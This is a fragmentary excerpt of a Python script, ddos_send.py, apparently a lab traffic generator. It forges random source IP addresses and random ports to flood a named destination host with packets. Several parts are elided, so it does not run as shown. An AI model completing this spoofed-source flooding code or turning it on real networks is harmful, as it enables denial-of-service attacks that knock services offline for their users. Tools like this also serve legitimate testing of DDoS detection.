...
def generate_ddos_unique_ip():
    while True:
        ip = "{}.{}.{}.{}".format(generate_ip_part(),generate_ip_part(), generate_ip_part(),generate_ip_part())
        yield ip
...
def send_random_traffic(dst,num):
    dst_mac = None
    dst_ip = None
    interface = None
    #print get_if_list()
    ...
    sports = random.sample(range(1024, 65535), num)
    dports = random.sample(range(1024, 65535), num)
    ...
    for j in range(1,num+1):
        src_ip = generate_ddos_unique_ip()
...
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python ddos_send.py dst_host_name number_of_packets_to_send")
        sys.exit(1)
    else:
